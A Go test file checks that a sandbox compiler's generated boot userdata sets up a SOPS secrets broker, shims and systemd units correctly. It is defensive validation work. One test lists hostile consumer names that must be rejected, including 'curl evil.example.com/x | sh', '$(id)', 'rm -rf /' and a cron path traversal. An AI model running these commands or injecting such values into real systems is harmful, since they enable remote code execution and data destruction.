package compiler

import (
	"strings"
	"testing"

	"github.com/whereiskurt/klanker-maker/pkg/profile"
)

// sopsBundleProfile returns a SandboxProfile with SopsBundlePresent (Spec.Secrets.SopsFile set).
func sopsBundleProfile() *profile.SandboxProfile {
	p := baseProfile()
	p.Spec.Secrets = &profile.SecretsSpec{
		SopsFile: "./secrets/test.enc.yaml",
	}
	return p
}

// TestUserdataSopsBlock_AbsentWhenFalse verifies that when SopsBundlePresent=false
// (the default — no Spec.Secrets set), the secrets blocks are NOT emitted.
// Existing profiles must be byte-identical: no secrets noise in output.
func TestUserdataSopsBlock_AbsentWhenFalse(t *testing.T) {
	p := baseProfile() // Spec.Secrets == nil → SopsBundlePresent=false
	out, err := generateUserData(p, "sb-default", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	// None of the secrets-specific markers must appear.
	for _, banned := range []string{
		"Brokered secret unsealing",
		"/etc/sandbox-secrets.env",
		"sops decrypt",
		"sandbox-secrets",
		"km-secretsd",
		"km-env",
		"/opt/km/shims",
	} {
		if strings.Contains(out, banned) {
			t.Errorf("secrets block must be absent when SopsBundlePresent=false; found %q in output", banned)
		}
	}
}

// TestUserdataSopsBlock_PresentWhenTrue verifies that when Spec.Secrets.SopsFile is
// set, the Phase 133 broker blocks ARE emitted: the binaries land, the ciphertext
// lands root-only, and the daemon unit is written and started.
func TestUserdataSopsBlock_PresentWhenTrue(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-abc123", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	required := []string{
		// Binaries: sops for the daemon's own decrypt, plus the broker and client.
		`s3://${KM_ARTIFACTS_BUCKET}/binaries/sops`,
		`s3://${KM_ARTIFACTS_BUCKET}/sidecars/km-secretsd`,
		`s3://${KM_ARTIFACTS_BUCKET}/sidecars/km-env`,
		`ln -sf /opt/km/bin/km-env /usr/local/bin/km-env`,
		// The bundle at rest, per sandbox.
		`s3://${KM_ARTIFACTS_BUCKET}/sandboxes/sb-abc123/secrets.enc.yaml`,
		// Ciphertext is root-only: no group read, unlike the Phase 89 plaintext file.
		`chown root:root /etc/sandbox-secrets.enc.yaml`,
		`chmod 0400 /etc/sandbox-secrets.enc.yaml`,
		// The daemon.
		`/etc/systemd/system/km-secretsd.service`,
		`ExecStart=/opt/km/bin/km-secretsd serve`,
		`systemctl enable --now km-secretsd.service`,
	}
	for _, want := range required {
		if !strings.Contains(out, want) {
			t.Errorf("expected %q in secrets block output; not found", want)
		}
	}
}

// TestUserdataSopsBlock_NoPlaintextAtRest is the phase in one assertion: the
// bundle is never decrypted to disk and never auto-exported into a login shell.
// A regression here silently restores the exact exposure Phase 133 removes —
// an `env` dump inside an agent turn collecting the whole bundle.
func TestUserdataSopsBlock_NoPlaintextAtRest(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-plain", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	for _, banned := range []string{
		"/etc/sandbox-secrets.env",
		"/etc/profile.d/zz-sandbox-secrets.sh",
		"sops decrypt --output-type dotenv",
	} {
		if strings.Contains(out, banned) {
			t.Errorf("userdata still emits %q: the bundle would be readable from every login shell again", banned)
		}
	}
}

// TestUserdataSopsBlock_StartLimitInUnitSection pins the km-execlog lesson.
// Since systemd v230 the [Service] section only recognises the pre-rename
// StartLimitInterval= spelling, so StartLimitIntervalSec=/StartLimitBurst=
// placed there are silently dropped as unknown — leaving a permanently broken
// broker hidden behind an endless restart loop instead of one failed unit.
func TestUserdataSopsBlock_StartLimitInUnitSection(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-startlimit", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	unitIdx := strings.Index(out, "Description=km secrets broker")
	if unitIdx < 0 {
		t.Fatal("km-secretsd unit not found in output")
	}
	serviceIdx := strings.Index(out[unitIdx:], "\n[Service]\n")
	if serviceIdx < 0 {
		t.Fatal("[Service] section not found in km-secretsd unit")
	}

	unitSection := out[unitIdx : unitIdx+serviceIdx]
	for _, want := range []string{"StartLimitIntervalSec=60", "StartLimitBurst=5"} {
		if !strings.Contains(unitSection, want) {
			t.Errorf("%q must appear in the [Unit] section, before [Service]; it would be silently dropped otherwise", want)
		}
	}
}

// TestUserdataSopsBlock_GrantsJSONIsSingleQuoted guards a systemd parsing trap.
// systemd strips double quotes from an unquoted Environment= value, so
// {"claude":["A"]} would reach the daemon as {claude:[A]} and fail to parse.
// Enclosing the whole assignment in single quotes makes the inner quotes literal.
func TestUserdataSopsBlock_GrantsJSONIsSingleQuoted(t *testing.T) {
	p := sopsBundleProfile()
	p.Spec.Secrets.Grants = map[string][]string{"claude": {"ANTHROPIC_API_KEY"}}
	out, err := generateUserData(p, "sb-grantq", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	want := `Environment='KM_SECRETS_GRANTS={"claude":["ANTHROPIC_API_KEY"]}'`
	if !strings.Contains(out, want) {
		t.Errorf("expected single-quoted grants env %q; not found", want)
	}
	if strings.Contains(out, `Environment=KM_SECRETS_GRANTS={"`) {
		t.Error("grants env is unquoted: systemd would strip the JSON's double quotes")
	}
}

// TestUserdataSopsBlock_ConsumersDefaultAndFromGrants pins the shim set.
// Absent grants the consumers are claude+codex; with grants they are the grant
// keys, sorted so the rendered userdata is deterministic across map iterations.
func TestUserdataSopsBlock_ConsumersDefaultAndFromGrants(t *testing.T) {
	t.Run("default consumers when no grants", func(t *testing.T) {
		p := sopsBundleProfile()
		out, err := generateUserData(p, "sb-defcons", nil, "my-bucket", false, nil)
		if err != nil {
			t.Fatalf("generateUserData failed: %v", err)
		}
		// Match the generating line, not the bare path: the surrounding comments
		// mention /opt/km/shims/claude and would satisfy a looser assertion.
		for _, want := range []string{`cat > "/opt/km/shims/claude"`, `cat > "/opt/km/shims/codex"`} {
			if !strings.Contains(out, want) {
				t.Errorf("expected default shim generation %q; not found", want)
			}
		}
		if !strings.Contains(out, `Environment='KM_SECRETS_GRANTS={}'`) {
			t.Error("expected an empty grants object when the profile declares none")
		}
	})

	t.Run("grant keys become the consumers, sorted", func(t *testing.T) {
		p := sopsBundleProfile()
		p.Spec.Secrets.Grants = map[string][]string{
			"zeta":  {"Z"},
			"alpha": {"A"},
		}
		out, err := generateUserData(p, "sb-grantcons", nil, "my-bucket", false, nil)
		if err != nil {
			t.Fatalf("generateUserData failed: %v", err)
		}
		alpha := strings.Index(out, `cat > "/opt/km/shims/alpha"`)
		zeta := strings.Index(out, `cat > "/opt/km/shims/zeta"`)
		if alpha < 0 || zeta < 0 {
			t.Fatalf("expected shims for both grant keys; alpha=%d zeta=%d", alpha, zeta)
		}
		if alpha > zeta {
			t.Error("shim generation is not sorted: userdata would differ run to run for the same profile")
		}
		if strings.Contains(out, `cat > "/opt/km/shims/claude"`) {
			t.Error("declared grants must replace the default consumer set, not extend it")
		}
	})
}

// TestUserdataSopsBlock_HostileConsumerNameIsRejected pins the compiler half of
// I3, and it is the half that actually matters on the remote path.
// cmd/create-handler never calls profile.Validate, so the JSON schema's
// propertyNames pattern is not consulted at all for a remote km create — this
// guard is then the ONLY barrier between a profile fetched from S3 and arbitrary
// root command execution during bootstrap. Deliberately exactly as strict as the
// validator, the same disposition the repo records for iam.allowedSecretPaths.
func TestUserdataSopsBlock_HostileConsumerNameIsRejected(t *testing.T) {
	hostile := []string{
		"claude; curl evil.example.com/x | sh",
		"claude' ; touch /tmp/pwned ; '",
		"../../etc/cron.d/x",
		"claude/codex",
		"claude codex",
		"claude$(id)",
		"claude\nrm -rf /",
		"",
		strings.Repeat("a", 65), // maxLength 64
	}
	for _, name := range hostile {
		t.Run(name, func(t *testing.T) {
			p := sopsBundleProfile()
			p.Spec.Secrets.Grants = map[string][]string{name: {"ANTHROPIC_API_KEY"}}
			out, err := generateUserData(p, "sb-hostile", nil, "my-bucket", false, nil)
			if err == nil {
				t.Fatalf("compile accepted consumer name %q; it would be interpolated "+
					"into the root boot shell. Output:\n%s", name, out)
			}
			if !strings.Contains(err.Error(), "consumer name") {
				t.Errorf("error should name the problem, got %v", err)
			}
		})
	}

	// The legitimate set must still compile, or the guard is just an outage.
	p := sopsBundleProfile()
	p.Spec.Secrets.Grants = map[string][]string{
		"claude": {"A"}, "codex": {"B"}, "km-env": {"C"}, "my_agent": {"D"}, "agent.v2": {"E"},
	}
	if _, err := generateUserData(p, "sb-ok", nil, "my-bucket", false, nil); err != nil {
		t.Fatalf("compile rejected legitimate consumer names: %v", err)
	}
}

// TestUserdataSopsBlock_ShimExecsAbsolutePath verifies the shim never resolves
// its target by bare name: doing so would re-find the shim on PATH and recurse
// until the process runs out of stack.
func TestUserdataSopsBlock_ShimExecsAbsolutePath(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-shimexec", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	if !strings.Contains(out, `exec /opt/km/bin/km-env exec --as 'claude' -- "\$KM_REAL" "\$@"`) {
		t.Error("shim must exec an absolute path via km-env, not the bare consumer name")
	}
	// The fallback search must strip the shim dir, or it re-finds the shim.
	if !strings.Contains(out, `grep -v '^/opt/km/shims$'`) {
		t.Error("shim fallback must remove /opt/km/shims from PATH before searching")
	}
}

// TestUserdataSopsBlock_ShimCarriesLiteralTargetForSelftest pins a cross-task
// contract. cmd/km-secretsd/selftest.go:shimTarget reads the generated shim to
// check the real binary still exists. The exec line is NOT the place to read it
// from: it carries the escaped token "\$KM_REAL", which the heredoc renders as a
// literal "$KM_REAL" on disk — os.Stat on that always fails, so the shim check
// would report FATAL on every boot of every sops sandbox (aborting the boot) and
// the PATH-race check after it would never run at all.
//
// The baked absolute path lives on the KM_REAL= line, which the UNQUOTED heredoc
// expands at generation time. That line is what a parser must read, and the
// generated shim says so in a comment so the coupling is discoverable from the
// file itself.
func TestUserdataSopsBlock_ShimCarriesLiteralTargetForSelftest(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-shimparse", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	// Unescaped on purpose: this one expands when the heredoc is written, which
	// is what puts a real path in the file. Escaping it would break the parser.
	if !strings.Contains(out, "\nKM_REAL=\"$KM_SHIM_TARGET\"\n") {
		t.Error("the shim's KM_REAL= line must carry the generation-time-expanded " +
			"absolute path: km-secretsd's selftest parses it to verify the target exists")
	}
	if !strings.Contains(out, "# NOTE: km-secretsd selftest (shimTarget) parses this KM_REAL= line") {
		t.Error("the generated shim must say that a parser depends on the KM_REAL= line, " +
			"or the next person to reformat the shim silently breaks the boot check")
	}
}

// TestUserdataSopsBlock_SocketDirExistsBeforeBrokerStarts pins C1. The broker
// binds /run/km/secrets.sock, and /run is tmpfs. The sidecar block that normally
// creates /run/km runs ~75 lines AFTER the 5.5 block, so without an earlier
// mkdir the daemon's net.Listen fails ENOENT on a fresh boot.
//
// The failure is doubly hidden, which is why this is pinned by position rather
// than presence: the ExecStartPost socket poll converts it into a chgrp error
// that blames the socket, and the 7.9 selftest SKIPS its socket check when the
// socket is absent instead of failing it — so the boot can print "secrets
// self-test passed" over a permanently dead broker.
func TestUserdataSopsBlock_SocketDirExistsBeforeBrokerStarts(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-sockdir", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	mkdir := strings.Index(out, "\nmkdir -p /run/km\n")
	start := strings.Index(out, "systemctl enable --now km-secretsd.service")
	if mkdir < 0 {
		t.Fatal("no mkdir -p /run/km in the output at all")
	}
	if start < 0 {
		t.Fatal("km-secretsd is never started")
	}
	if mkdir > start {
		t.Errorf("the first mkdir -p /run/km (byte %d) comes AFTER km-secretsd starts "+
			"(byte %d): the broker would fail ENOENT binding its socket", mkdir, start)
	}

	// Reboot and resume never run userdata, and this unit is not ordered after
	// the one that recreates /run/km, so the unit must create it itself.
	if !strings.Contains(out, "ExecStartPre=/bin/mkdir -p /run/km") {
		t.Error("km-secretsd.service needs ExecStartPre=/bin/mkdir -p /run/km: " +
			"/run is tmpfs and userdata does not re-run on reboot or km resume")
	}
	// RuntimeDirectory=km would look equivalent and is not: its default
	// RuntimeDirectoryPreserve=no DELETES /run/km when the broker stops, taking
	// the km-audit-log sidecar's audit-pipe FIFO with it.
	// Anchored at line start so the comment explaining why we avoid it does not
	// satisfy the check.
	if strings.Contains(out, "\nRuntimeDirectory=km") {
		t.Error("RuntimeDirectory=km would delete /run/km on stop, destroying the audit FIFO")
	}
}

// TestUserdataSopsBlock_AMIRelaunchCannotBakeSelfTargetingShim pins I2.
// /opt/km/shims is on the root volume, so a sandbox launched from a baked AMI
// (spec.runtime.ami, a shipped feature) starts with the bake source's shims
// present AND on PATH. A plain `command -v claude` then returns the shim, and we
// would bake a shim whose target is itself. The runtime fallback does not save
// it — that path IS executable — and km-secretsd's selftest treats a
// self-targeting shim as fatal, so every AMI-backed secrets profile would abort
// its boot.
func TestUserdataSopsBlock_AMIRelaunchCannotBakeSelfTargetingShim(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-amishim", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	if !strings.Contains(out, "rm -f /opt/km/shims/*") {
		t.Error("stale shims from an AMI bake must be cleared before regenerating")
	}
	// Belt as well as braces: resolution must exclude the shim dir the same way
	// the generated shim's own fallback does.
	if !strings.Contains(out, `grep -v "^/opt/km/shims$"`) {
		t.Error("target resolution must strip /opt/km/shims from PATH, or a surviving " +
			"shim resolves as its own target")
	}
	// The bare form is the bug; it must not survive anywhere.
	if strings.Contains(out, `bash -lc 'command -v claude'`) {
		t.Error("resolution still uses an unfiltered PATH lookup")
	}
}

// TestUserdataSopsBlock_ConsumerNameIsNeverSplicedIntoScript pins the shell half
// of I3. The schema and the compiler both reject a metacharacter-bearing
// consumer name, but the boot script should not depend on that being the only
// line of defence: the name is passed to the resolver as a positional ARGUMENT
// rather than spliced into the script text, and every path built from it is
// quoted.
func TestUserdataSopsBlock_ConsumerNameIsNeverSplicedIntoScript(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-noSplice", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	if !strings.Contains(out, `command -v "$1"' km-shim 'claude'`) {
		t.Error("the consumer name must reach the resolver as a positional argument, not as script text")
	}
	for _, want := range []string{
		`cat > "/opt/km/shims/claude"`,
		`chmod 0755 "/opt/km/shims/claude"`,
		`chown root:root "/opt/km/shims/claude"`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected quoted path %q; an unquoted one word-splits on a hostile name", want)
		}
	}
}

// TestUserdataSopsBlock_ShimPrependAlsoInBashrc pins I4. nvm installs NO
// /etc/profile.d script — its installer APPENDS to ~/.bashrc, and a bash login
// shell reads /etc/profile.d/* BEFORE ~/.profile sources ~/.bashrc. So nvm's
// prepend lands after ours and an nvm-managed agent beats /opt/km/shims.
// profile.d alone leaves the shim inert with no error wherever nvm owns the
// agent, and km-secretsd's selftest asserts the login-shell resolution as FATAL,
// so the boot would abort. Today's profiles escape only by accident.
func TestUserdataSopsBlock_ShimPrependAlsoInBashrc(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-bashrc", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	if !strings.Contains(out, "/home/sandbox/.bashrc") {
		t.Fatal("the shim prepend must also reach the sandbox user's ~/.bashrc, " +
			"or nvm's own prepend wins the interactive and login-shell paths")
	}
	// Guarded, because userdata's shim section can run again on an AMI relaunch
	// where ~/.bashrc is baked in.
	if !strings.Contains(out, `grep -q '/opt/km/shims' "$KM_SANDBOX_BASHRC"`) {
		t.Error("the ~/.bashrc append must be guarded against duplicating on repeated boots")
	}
	// Both hooks, not one: profile.d covers the case where ~/.bashrc returns
	// early (a non-interactive login shell on a distro whose .bashrc guards on
	// interactivity), and nvm does not run there either.
	if !strings.Contains(out, "/etc/profile.d/zz-km-shims.sh") {
		t.Error("the profile.d hook must be kept alongside the ~/.bashrc append")
	}
	// The old comment blamed a profile.d script nvm does not install. A wrong
	// explanation is what misleads the next person to "simplify" this.
	if strings.Contains(out, "wins over nvm's own\n# profile.d script") {
		t.Error("the stale nvm/profile.d explanation is back; nvm appends to ~/.bashrc")
	}
}

// TestUserdataSopsBlock_BootCheckAborts verifies the boot self-test runs inline
// during userdata. Under `set -euo pipefail` a non-zero exit aborts the boot —
// the same disposition as the Phase 89 sops-decrypt FATAL it replaces. A box
// that looks healthy and fails at first turn is worse, because an autonomous
// trigger finds it before a human does.
func TestUserdataSopsBlock_BootCheckAborts(t *testing.T) {
	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-bootchk", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	if !strings.Contains(out, "/opt/km/bin/km-secretsd selftest") {
		t.Fatal("expected an inline km-secretsd selftest invocation; not found")
	}
	// Resume coverage: userdata does not re-run on stop/start, so the oneshot
	// unit is the only thing that re-checks a rotated bundle on a resumed box.
	for _, want := range []string{
		"/etc/systemd/system/km-secrets-check.service",
		"Requires=km-secretsd.service",
		"systemctl enable km-secrets-check.service",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected %q for resume coverage; not found", want)
		}
	}
}

// TestUserdataSopsBlock_ShimPathHeredocByteCheck locks down the heredoc body
// between << 'KMSHIMPATH' and KMSHIMPATH so Go template trim-semantics ({{- }})
// cannot silently elide leading whitespace or newlines. A mangled case statement
// here fails open: PATH keeps its default and every interactive km shell runs
// the unshimmed agent with no secrets.
func TestUserdataSopsBlock_ShimPathHeredocByteCheck(t *testing.T) {
	const expectedHeredocBody = "case \":$PATH:\" in\n  *\":/opt/km/shims:\"*) ;;\n  *) PATH=\"/opt/km/shims:$PATH\"; export PATH ;;\nesac"

	p := sopsBundleProfile()
	out, err := generateUserData(p, "sb-test", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}

	startMarker := "<< 'KMSHIMPATH'\n"
	endMarker := "\nKMSHIMPATH\n"

	startIdx := strings.Index(out, startMarker)
	if startIdx < 0 {
		t.Fatal("expected heredoc marker \"<< 'KMSHIMPATH'\\n\" in output; not found")
	}
	bodyStart := startIdx + len(startMarker)

	endIdx := strings.Index(out[bodyStart:], endMarker)
	if endIdx < 0 {
		t.Fatal("expected heredoc terminator '\\nKMSHIMPATH\\n' after body start; not found")
	}

	actualBody := out[bodyStart : bodyStart+endIdx]
	if actualBody != expectedHeredocBody {
		t.Errorf("shim PATH heredoc body mismatch\nwant: %q\n got: %q", expectedHeredocBody, actualBody)
	}
}

// TestUserdataSopsBlock_DispatchPrependIsGatedAndRendered verifies both halves of
// the dormancy contract for the dispatch-site PATH prepend: it renders when a
// bundle is present, and it leaves no trace at all when one is not.
func TestUserdataSopsBlock_DispatchPrependIsGatedAndRendered(t *testing.T) {
	// Backslash-escaped in the emitted poller script: the outer double-quoted
	// string belongs to the poller shell, and only the inner `bash -lc`/`bash -c`
	// may expand PATH.
	const prepend = `PATH=/opt/km/shims:\$PATH; `

	with, err := generateUserData(sopsBundleProfile(), "sb-disp1", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}
	if !strings.Contains(with, prepend) {
		t.Error("dispatch sites must prepend the shim dir when a bundle is present")
	}

	without, err := generateUserData(baseProfile(), "sb-disp2", nil, "my-bucket", false, nil)
	if err != nil {
		t.Fatalf("generateUserData failed: %v", err)
	}
	if strings.Contains(without, prepend) {
		t.Error("dispatch sites must be byte-identical to pre-Phase-133 when no bundle is present")
	}
}
